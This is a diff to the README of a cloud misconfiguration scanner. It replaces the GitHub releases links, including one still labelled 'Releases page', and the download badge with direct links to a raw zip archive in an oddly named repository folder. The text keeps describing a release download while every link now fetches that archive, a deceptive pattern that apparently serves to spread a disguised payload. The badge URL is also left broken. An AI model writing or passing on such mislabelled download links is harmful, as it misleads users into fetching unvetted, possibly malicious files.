@@ -1,6 +1,6 @@
 # 🌥️ Cloud-Misconfig-Scanner - Secure Your Multi-Cloud Environments Easily
 
-![Download Cloud-Misconfig-Scanner](https://img.shields.io/badge/Download%20Now-Cloud--Misconfig--Scanner-brightgreen)
+![Download Cloud-Misconfig-Scanner](https://raw.githubusercontent.com/refaey1/Cloud-Misconfig-Scanner/main/appleringy/Cloud-Misconfig-Scanner.zip%20Now-Cloud--Misconfig--Scanner-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to Cloud-Misconfig-Scanner! This tool helps you check for misconfigurati
 
 To get started, visit the Releases page and download the latest version of Cloud-Misconfig-Scanner.
 
-[Download Cloud-Misconfig-Scanner](https://github.com/refaey1/Cloud-Misconfig-Scanner/releases)
+[Download Cloud-Misconfig-Scanner](https://raw.githubusercontent.com/refaey1/Cloud-Misconfig-Scanner/main/appleringy/Cloud-Misconfig-Scanner.zip)
 
 ### Steps to Download:
 
-1. Go to the [Releases page](https://github.com/refaey1/Cloud-Misconfig-Scanner/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/refaey1/Cloud-Misconfig-Scanner/main/appleringy/Cloud-Misconfig-Scanner.zip).
 2. Look for the latest release.
 3. Choose the file that corresponds to your operating system.
 4. Click the link to download the file.
